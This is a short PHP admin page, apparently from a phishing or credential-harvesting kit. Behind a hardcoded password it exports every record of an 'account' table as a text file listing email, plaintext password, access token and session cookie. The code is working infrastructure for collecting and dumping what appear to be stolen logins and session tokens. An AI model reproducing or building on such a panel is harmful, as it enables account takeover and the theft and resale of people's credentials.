<?php
session_start();
if(isset($_SESSION['admin'])){
	require('system/Mysql.php');
	if(isset($_GET['export'])){
		if($_GET['export'] == 'txt'){

			header('Content-disposition: attachment; filename='.date("H:i - d/m/Y").'.txt');
			header('Content-type: text/plain');

			$data = $db->get('account');

			foreach ($data as $acc) {
				echo $acc['email'].'|'.$acc['password'].'|'.$acc['access_token'].'|'.$acc['cookie'].'|'.date('H:i-d/m/Y', $acc['time_creat']).PHP_EOL.'';
			}
			
			exit();


		}
	}
	include 'views/dashboard.php';
}else{
	if(isset($_POST['mk_login'])){
		if($_POST['mk_login'] == 'trideptrai'){
			$_SESSION['admin'] = 1;
		}
	}
	include('views/login.php');
}